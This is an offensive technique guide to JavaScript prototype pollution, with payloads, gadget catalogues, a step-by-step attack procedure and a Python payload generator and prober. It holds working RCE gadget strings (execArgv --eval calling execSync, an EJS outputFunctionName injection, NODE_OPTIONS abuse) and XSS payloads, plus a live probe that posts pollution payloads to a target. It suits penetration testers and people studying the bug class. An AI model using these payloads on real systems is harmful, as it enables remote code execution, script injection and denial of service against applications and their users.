---
title: "Prototype Pollution - Client-Side and Server-Side Gadget Hunting"
category: web
subcategory: nodejs
type: technique
tags: [prototype-pollution, proto-pollution, __proto__, constructor-prototype, javascript, nodejs, lodash-merge, _.merge, deepmerge, qs, object-assign, gadget, rce, xss, child-process, ppmap, ppfuzz]
difficulty: medium
summary: "obj[__proto__][x]=y with a recursive merge/set pollutes Object.prototype; a downstream gadget (spawn opts, template config, DOM sink) turns that into RCE or XSS."
when_to_use:
  - "A recursive merge/set/extend runs on user JSON (_.merge, deepmerge, $.extend(true))"
  - "A query string reaches an object via qs/express (a[__proto__][b]=c)"
  - "You can set a property but need a gadget that reads Object.prototype to reach a sink"
  - "Client-side: a config object is merged from location/hash and feeds innerHTML/scriptsrc"
tools: [burp, dom-invader, ppmap, ppfuzz, node]
related: [deser-node-vm-escape, node-parameter-pollution, node-cors-postmessage-websocket, graphql-attacks]
---

## TL;DR

JavaScript objects share `Object.prototype`. If code does `dst[key][key2] = val` with attacker
keys, `key = "__proto__"` makes `key2` a property of **every** object. That alone is rarely the
flag -- you then need a *gadget*: code that later reads an unset option and finds your polluted
value, reaching a sink (`child_process` options -> RCE server-side, `innerHTML`/`src` -> XSS
client-side).

## Recognise it

- Source: `_.merge`, `_.defaultsDeep`, `_.mergeWith`, `_.set`, `_.setWith`, `$.extend(true,...)`,
  `deepmerge`, `mixin-deep`, `set-value`, `dot-prop`, `assign-deep`, `merge-options`,
  `flat`/`unflatten`, a hand-rolled recursive copy, `JSON.parse` + merge.
- A query string that reaches an object: `qs`, `express` `req.query`, `req.body`.
- Behaviour oracle: after `?__proto__[foo]=bar`, some later object exposes `.foo`.
- Client-side: a config/options object built from `location.hash`, `postMessage`, or a JSON
  blob, then fed to a template or DOM API.

## Theory

### The mechanism

```js
function merge(dst, src) {
  for (const k in src) {
    if (typeof src[k] === 'object') merge(dst[k] = dst[k] || {}, src[k]);
    else dst[k] = src[k];
  }
}
merge({}, JSON.parse('{"__proto__":{"polluted":"yes"}}'));
({}).polluted === "yes";   // true -- EVERY object now has it
```

`dst["__proto__"]` is not a normal property write: it resolves to the object's prototype, so
`dst["__proto__"]["polluted"] = "yes"` mutates `Object.prototype`. `Object.assign` and the
spread operator are **safe** because they do a shallow, own-property copy that treats
`__proto__` as a literal own key (or ignores it), never recursing into the prototype.

### The three key spellings

```
__proto__                       most common; blocked by many sanitizers
constructor.prototype           equivalent: obj.constructor is the class, .prototype is the shared proto
constructor[prototype]          bracket form, survives dot-splitting filters
```

In a query string / `qs`:

```
?__proto__[polluted]=yes
?constructor[prototype][polluted]=yes
?a[__proto__][polluted]=yes           (when the sink merges a nested object)
```

In JSON:

```json
{"__proto__": {"polluted": "yes"}}
{"constructor": {"prototype": {"polluted": "yes"}}}
```

### Detection oracles (non-destructive)

- **Server whitespace oracle**: Express `json spaces` setting controls `JSON.stringify`
  indentation. Pollute `?__proto__[json spaces]=10` and every JSON response is suddenly
  indented -- a clean, reversible boolean.
- **`x-powered-by`**: pollute `?__proto__[x-powered-by]=pwned` -> the response header appears.
- **Status/exposedHeaders**: `__proto__[status]=510`, `__proto__[exposedHeaders]=...`.
- **Client-side**: `?__proto__[foo]=bar` then read `Object.prototype.foo` in the console.

### Server-side gadgets (RCE)

The strongest sink is `child_process`, whose options object reads unset properties from the
prototype:

```
// spawn/exec/fork options -> command execution
__proto__[shell]=/proc/self/exe            // node itself as the shell
__proto__[NODE_OPTIONS]=--inspect=...       // via env
__proto__[env][NODE_OPTIONS]=--require /proc/self/environ
__proto__[argv0]=node
__proto__[execArgv][0]=--eval=require('child_process').execSync('id')
```

The classic chain: pollute `execArgv` / `NODE_OPTIONS` / `shell`, then any later
`child_process.spawn/exec/fork` (e.g. an image thumbnailer, a git call, a `require('child_process')`
anywhere) inherits your options and runs your command.

Template-engine gadgets (RCE without spawning):

```
// EJS
__proto__[outputFunctionName]=x;process.mainModule.require('child_process').execSync('id');//
__proto__[client]=true & __proto__[escapeFunction]=...
// Pug
__proto__[compileDebug]=1 & __proto__[self]=1 & __proto__[line]=...(payload)
// Handlebars
__proto__[<internal compiler option>]=...
```

### Client-side gadgets (XSS)

Pollute a property that a library reads as HTML/URL/config:

```
__proto__[srcdoc]=<img src onerror=alert(1)>          // iframe srcdoc gadget
__proto__[src]=data:,alert(1)                          // script src gadget
__proto__[innerHTML]=...                               // jQuery/library sink
__proto__[url]=//evil                                  // AJAX gadget
__proto__[template]=<script>alert(1)</script>          // Vue/Angular compile
__proto__[allowedTags]=...                             // sanitizer bypass
__proto__[transport_url] / __proto__[divId] / ... library-specific script loaders
```

DOM Invader (Burp) enumerates client-side sources and gadgets automatically.

### Defences (and why they sometimes fail)

- `Object.create(null)` for config objects (no prototype to pollute).
- `Object.freeze(Object.prototype)` (rare; breaks some libraries).
- `--disable-proto=delete` / `--disable-proto=throw` Node flag (only blocks `__proto__`, not
  `constructor.prototype`).
- `Map` instead of plain objects.
- JSON schema validation before merge.
- A key blocklist -- usually incomplete; `constructor.prototype` slips past `__proto__`-only checks.

## Attack

1. Find the merge/set sink and confirm you reach it with a nested object.
2. Fire a non-destructive oracle (`json spaces`, `x-powered-by`, or `Object.prototype.foo`).
3. Enumerate gadgets: for RCE, look for a later `child_process` call and pollute `execArgv`/
   `shell`/`NODE_OPTIONS` or a template option; for XSS, pollute a DOM/library config key.
4. If `__proto__` is filtered, switch to `constructor[prototype]` or `constructor.prototype`.
5. Pollution persists for the process (server) or the page (client) -- one request can affect
   later requests, which is both an exploit primitive and a footgun (DoS/other users).

## Code

```python
#!/usr/bin/env python3
"""Prototype-pollution payload generator + Express whitespace-oracle prober.

Emits pollution payloads in every encoding (JSON body, qs bracket, dotted
path, nested, constructor.prototype variant). Self-tests the generators
offline against expected strings; the prober needs `requests` + a target.
"""
from __future__ import annotations

import json
import sys
import urllib.parse


def json_body(path: list[str], value) -> str:
    """Nested JSON: {"__proto__":{"x":value}}."""
    obj: dict = {}
    cur = obj
    for k in path[:-1]:
        cur[k] = {}
        cur = cur[k]
    cur[path[-1]] = value
    return json.dumps(obj)


def qs_bracket(path: list[str], value: str) -> str:
    """qs/Express bracket form: a[__proto__][x]=value."""
    key = path[0] + "".join("[%s]" % p for p in path[1:])
    return "%s=%s" % (urllib.parse.quote(key), urllib.parse.quote(str(value)))


def dotted_path(path: list[str], value: str) -> str:
    """lodash _.set / dot-prop dotted string: __proto__.x."""
    return "%s=%s" % (".".join(path), value)


def all_forms(prop: str, value: str) -> dict[str, str]:
    """Every spelling for polluting Object.prototype[prop] = value."""
    return {
        "json_proto": json_body(["__proto__", prop], value),
        "json_ctor": json_body(["constructor", "prototype", prop], value),
        "qs_proto": qs_bracket(["__proto__", prop], value),
        "qs_ctor": qs_bracket(["constructor", "prototype", prop], value),
        "qs_nested": qs_bracket(["x", "__proto__", prop], value),
        "dotted": dotted_path(["__proto__", prop], value),
        "dotted_ctor": dotted_path(["constructor", "prototype", prop], value),
    }


# --- known gadgets ---------------------------------------------------------

RCE_GADGETS = {
    "execArgv": ["__proto__", "execArgv", "0"],   # --eval=... on next fork
    "shell": ["__proto__", "shell"],
    "NODE_OPTIONS": ["__proto__", "env", "NODE_OPTIONS"],
    "argv0": ["__proto__", "argv0"],
    "ejs_outputFunctionName": ["__proto__", "outputFunctionName"],
    "pug_compileDebug": ["__proto__", "compileDebug"],
}

XSS_GADGETS = {
    "srcdoc": ["__proto__", "srcdoc"],
    "src": ["__proto__", "src"],
    "innerHTML": ["__proto__", "innerHTML"],
    "url": ["__proto__", "url"],
    "template": ["__proto__", "template"],
}

ORACLES = {
    "json_spaces": ("json spaces", "10"),
    "x_powered_by": ("x-powered-by", "pwned"),
    "status": ("status", "510"),
}


def oracle_payload(name: str) -> str:
    prop, val = ORACLES[name]
    return json_body(["__proto__", prop], int(val) if val.isdigit() else val)


def probe_json_spaces(base_url: str, session=None) -> bool:
    """Send the json-spaces oracle and detect indentation in the response.

    Requires `requests`. Returns True if the app's JSON responses became
    pretty-printed (i.e. Object.prototype was polluted).
    """
    import requests
    s = session or requests.Session()
    before = s.get(base_url, timeout=10).text
    s.post(base_url, json=json.loads(oracle_payload("json_spaces")), timeout=10)
    after = s.get(base_url, timeout=10).text
    # pollution adds indentation: newlines + leading spaces that were absent
    return ("\n          " in after) and ("\n          " not in before)


def _self_test() -> None:
    forms = all_forms("polluted", "yes")

    # JSON forms parse and place the value at the right depth
    a = json.loads(forms["json_proto"])
    assert a["__proto__"]["polluted"] == "yes"
    b = json.loads(forms["json_ctor"])
    assert b["constructor"]["prototype"]["polluted"] == "yes"

    # qs bracket form
    assert forms["qs_proto"] == "__proto__%5Bpolluted%5D=yes", forms["qs_proto"]
    assert "constructor%5Bprototype%5D%5Bpolluted%5D=yes" == forms["qs_ctor"]
    # nested sink form keeps the outer key
    assert forms["qs_nested"].startswith("x%5B__proto__%5D"), forms["qs_nested"]

    # dotted form
    assert forms["dotted"] == "__proto__.polluted=yes"
    assert forms["dotted_ctor"] == "constructor.prototype.polluted=yes"

    # RCE gadget paths
    j = json.loads(json_body(RCE_GADGETS["execArgv"], "--eval=x"))
    assert j["__proto__"]["execArgv"]["0"] == "--eval=x"
    j2 = json.loads(json_body(RCE_GADGETS["NODE_OPTIONS"], "--require /x"))
    assert j2["__proto__"]["env"]["NODE_OPTIONS"] == "--require /x"

    # XSS gadget paths
    x = json.loads(json_body(XSS_GADGETS["srcdoc"], "<img src onerror=alert(1)>"))
    assert "onerror" in x["__proto__"]["srcdoc"]

    # oracle payloads
    o = json.loads(oracle_payload("json_spaces"))
    assert o["__proto__"]["json spaces"] == 10
    o2 = json.loads(oracle_payload("x_powered_by"))
    assert o2["__proto__"]["x-powered-by"] == "pwned"

    # every form is produced
    assert len(forms) == 7
    assert len(RCE_GADGETS) == 6 and len(XSS_GADGETS) == 5

    print("[ok] %d encodings, %d RCE gadgets, %d XSS gadgets, %d oracles verified"
          % (len(forms), len(RCE_GADGETS), len(XSS_GADGETS), len(ORACLES)))


def main() -> int:
    prop = sys.argv[1] if len(sys.argv) > 1 else "polluted"
    val = sys.argv[2] if len(sys.argv) > 2 else "yes"
    for name, payload in all_forms(prop, val).items():
        print("%-14s %s" % (name, payload))
    return 0


if __name__ == "__main__":
    if len(sys.argv) > 1:
        raise SystemExit(main())
    _self_test()
```

## Variants & pitfalls

- **Pollution is global and sticky.** On the server it persists across requests for the whole
  process -- great for a delayed gadget, dangerous because you can break the app for everyone
  (and yourself). Pick a harmless property for oracles.
- **`Object.assign`, spread, `Map`, `Object.create(null)` are not vulnerable.** Do not waste
  payloads on them.
- **`JSON.parse` alone is safe**; the bug is the *merge/set* that follows.
- **`__proto__` as a JSON key** is honoured by `JSON.parse` as a literal own-property in the
  parsed object, but the subsequent recursive merge is what walks into the real prototype.
- **`constructor.prototype`** bypasses `__proto__`-only blocklists but fails if the code guards
  `constructor` too, or if the object is `Object.create(null)`.
- **Array pollution**: polluting `length` or numeric indices on `Array.prototype` can corrupt
  unrelated loops -- another DoS footgun.
- **Client vs server gadgets differ**: a server pollution needs a *server* sink (spawn/template),
  a client pollution needs a *DOM* sink; the pollution primitive can be the same request.
- **`--disable-proto=delete`** only removes `__proto__`; use `constructor.prototype`.
- **Framework mitigations**: modern lodash `_.merge` still pollutes via `constructor.prototype`
  on some versions; `_.mergeWith` and `_.defaultsDeep` historically did; check the exact version.
- **Cleanup**: `delete Object.prototype.polluted` after testing to avoid poisoning other tests.

## Tools

- Burp DOM Invader -- client-side source/gadget enumeration and prototype-pollution mode.
- `ppmap`, `ppfuzz`, `pp-finder` -- automated server-side detection.
- `node --disable-proto=throw` to confirm which spelling a target relies on.
- The generator above for crafting the exact encoding a sink expects.

## References

- Olivier Arteau -- "Prototype pollution attacks in NodeJS applications" (NorthSec 2018), the original.
- PortSwigger Web Security Academy -- Prototype pollution (client and server labs), DOM Invader.
- BlackFan / client-side-prototype-pollution -- gadget catalogue.
- Node.js documentation -- `--disable-proto`, `child_process` options object.
